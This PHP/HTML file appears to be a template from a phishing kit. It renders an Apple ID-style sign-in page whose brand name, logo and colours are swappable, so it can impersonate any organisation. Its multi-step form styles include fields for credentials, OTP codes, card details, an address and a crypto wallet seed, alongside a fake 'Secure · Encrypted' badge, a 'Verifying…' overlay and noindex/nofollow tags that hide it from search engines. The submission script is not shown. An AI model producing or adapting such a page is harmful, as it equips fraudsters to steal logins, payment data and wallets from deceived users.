<?php
// Tech template — Apple ID style: centered logo, clean white, system-ui font, no labels
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title><?=$org_name?> — Sign In</title>
<meta name="robots" content="noindex,nofollow">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'SF Pro Text','Segoe UI',Roboto,Helvetica,Arial,sans-serif;min-height:100vh;min-height:100dvh;background:#f5f5f7;display:flex;align-items:center;justify-content:center;padding:20px 16px;color:#1d1d1f}
.card{width:100%;max-width:400px;background:#fff;border-radius:18px;overflow:hidden;box-shadow:0 4px 30px rgba(0,0,0,.12)}

/* Header — clean Apple style, centered */
.hd{padding:36px 32px 24px;text-align:center;background:#fff;border-bottom:1px solid rgba(0,0,0,.06)}
.logo-box{width:64px;height:64px;background:<?=$logo_bg?>;border-radius:14px;display:inline-flex;align-items:center;justify-content:center;overflow:hidden;margin-bottom:14px}
.logo-box img{width:100%;height:100%;object-fit:contain}
.logo-ini{font-size:24px;font-weight:700;color:<?=$accent?>}
.hd-title{font-size:22px;font-weight:700;color:#1d1d1f;letter-spacing:-.4px;margin-bottom:4px}
.hd-sub{font-size:13px;color:#6e6e73;line-height:1.4}

/* Step dots — small, minimal */
.steps{display:flex;justify-content:center;gap:4px;padding:14px 0 0}
.dot{width:6px;height:6px;border-radius:50%;background:#d2d2d7;transition:background .3s}
.dot.active{background:<?=$accent?>;transform:scale(1.2)}
.dot.done{background:<?=$accent?>;opacity:.4}

/* Body */
.bd{padding:24px 32px 20px}
.step-title{font-size:20px;font-weight:700;color:#1d1d1f;letter-spacing:-.3px;text-align:center;margin-bottom:4px}
.step-sub{font-size:13px;color:#6e6e73;text-align:center;margin-bottom:20px;line-height:1.5}

/* Apple-style inputs — NO labels, placeholder only */
.field{margin-bottom:12px}
.field label{display:none}
.field input{width:100%;background:#f5f5f7;border:1px solid rgba(0,0,0,.12);color:#1d1d1f;padding:13px 16px;border-radius:10px;font-size:15px;outline:none;transition:border-color .15s,box-shadow .15s;font-family:inherit;-webkit-appearance:none}
.field input:focus{border-color:<?=$accent?>;box-shadow:0 0 0 4px rgba(<?=$ar?>,<?=$ag?>,<?=$ab?>,.12);background:#fff}
.field input::placeholder{color:#aeaeb2}
.or-div{text-align:center;font-size:12px;color:#aeaeb2;margin:8px 0;position:relative}
.or-div::before,.or-div::after{content:'';position:absolute;top:50%;width:43%;height:1px;background:rgba(0,0,0,.08)}
.or-div::before{left:0}.or-div::after{right:0}
.card-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
.btn{width:100%;padding:14px;background:<?=$accent?>;color:#fff;font-size:16px;font-weight:600;border:none;border-radius:12px;cursor:pointer;margin-top:8px;transition:filter .15s;position:relative;font-family:inherit}
.btn:hover{filter:brightness(.92)}
.btn:disabled{opacity:.5;cursor:not-allowed}
.btn.loading::after{content:'';position:absolute;right:16px;top:50%;width:17px;height:17px;border:2px solid rgba(255,255,255,.4);border-top-color:#fff;border-radius:50%;transform:translateY(-50%);animation:spin .7s linear infinite}
@keyframes spin{to{transform:translateY(-50%) rotate(360deg)}}
.err-msg{font-size:12px;color:#ff3b30;margin-top:8px;text-align:center;display:none}
.security-note{display:flex;align-items:center;gap:5px;justify-content:center;font-size:11px;color:#aeaeb2;margin-top:14px}
.wallet-area{width:100%;min-height:80px;background:#f5f5f7;border:1px solid rgba(0,0,0,.12);color:#1d1d1f;padding:13px 16px;border-radius:10px;font-size:13px;font-family:monospace;outline:none;resize:none}
.wallet-area:focus{border-color:<?=$accent?>}
.wallet-hint{font-size:11px;color:#aeaeb2;margin-top:6px;text-align:center;line-height:1.5}
.otp-wrap{display:flex;gap:8px;justify-content:center}
.otp-wrap input{flex:1;text-align:center;font-size:24px;font-weight:600;padding:12px 4px;max-width:46px;background:#f5f5f7;border:1px solid rgba(0,0,0,.12);border-radius:10px;color:#1d1d1f;outline:none}
.otp-wrap input:focus{border-color:<?=$accent?>;box-shadow:0 0 0 4px rgba(<?=$ar?>,<?=$ag?>,<?=$ab?>,.12)}
.otp-hint{font-size:12px;color:#aeaeb2;text-align:center;margin-top:8px}
.addr-area{width:100%;min-height:60px;background:#f5f5f7;border:1px solid rgba(0,0,0,.12);color:#1d1d1f;padding:13px 16px;border-radius:10px;font-size:14px;font-family:inherit;outline:none;resize:none}
.addr-area:focus{border-color:<?=$accent?>}
.card-footer{padding:14px 20px;background:#f5f5f7;border-top:1px solid rgba(0,0,0,.06);font-size:10.5px;color:#aeaeb2;text-align:center;line-height:1.6}

#loadOverlay{display:none;position:fixed;inset:0;background:rgba(255,255,255,.85);z-index:999;align-items:center;justify-content:center;flex-direction:column;gap:16px}
#loadOverlay.show{display:flex}
.load-spin{width:36px;height:36px;border:2px solid rgba(0,0,0,.08);border-top-color:<?=$accent?>;border-radius:50%;animation:spin .8s linear infinite}
.load-txt{font-size:13px;color:#6e6e73}

@media(max-width:480px){
  body{padding:0;align-items:flex-start;background:#fff}
  .card{border-radius:0;min-height:100vh;min-height:100dvh;box-shadow:none}
  .bd{padding:20px 20px 16px}
  .hd{padding:32px 20px 20px}
}
</style>
</head>
<body>
<div id="loadOverlay"><div class="load-spin"></div><div class="load-txt" id="loadText">Verifying…</div></div>

<div class="card">
  <div class="hd">
    <div class="logo-box">
      <?php if($logo_url):?><img src="<?=htmlspecialchars($logo_url)?>" alt="" onerror="this.style.display='none';this.nextElementSibling.style.display='flex'"><?php endif?>
      <span class="logo-ini" style="display:<?=$logo_url?'none':'flex'?>;align-items:center;justify-content:center;width:100%;height:100%"><?=mb_strtoupper(mb_substr($org_name,0,2))?></span>
    </div>
    <div class="hd-title"><?=htmlspecialchars($org_name)?></div>
    <div class="hd-sub"><?=htmlspecialchars($org_sub)?></div>
    <div class="steps" id="stepDots">
      <?php for($i=1;$i<=$total_steps;$i++): ?>
      <div class="dot <?=$i===1?'active':''?>" id="d<?=$i?>"></div>
      <?php endfor; ?>
    </div>
  </div>

  <div class="bd">
    <?php for($sn=1;$sn<=$total_steps;$sn++): ?>
    <div id="step<?=$sn?>" <?=$sn>1?'style="display:none"':''?>>
      <div class="step-title"><?=htmlspecialchars($sc['step_titles'][$sn])?></div>
      <div class="step-sub" id="step<?=$sn?>sub"><?=htmlspecialchars($sc['step_subs'][$sn])?></div>
      <form onsubmit="submitStep(event,<?=$sn?>)">
        <?php $fld = $sc['step'.$sn.'_fields'] ?? 'email_only'; include __DIR__.'/partials/fields.php'; ?>
        <button type="submit" class="btn" id="btn<?=$sn?>"><?=htmlspecialchars($sc['btn_labels'][$sn-1])?></button>
        <div class="err-msg" id="err<?=$sn?>">Please enter the required information.</div>
      </form>
      <div class="security-note">🔒 Secure &middot; Encrypted</div>
    </div>
    <?php endfor; ?>
  </div>

  <?php if($footer): ?>
  <div class="card-footer"><?=htmlspecialchars($footer)?></div>
  <?php endif; ?>
</div>

<?php include __DIR__.'/partials/js.php'; ?>
</body>
</html>
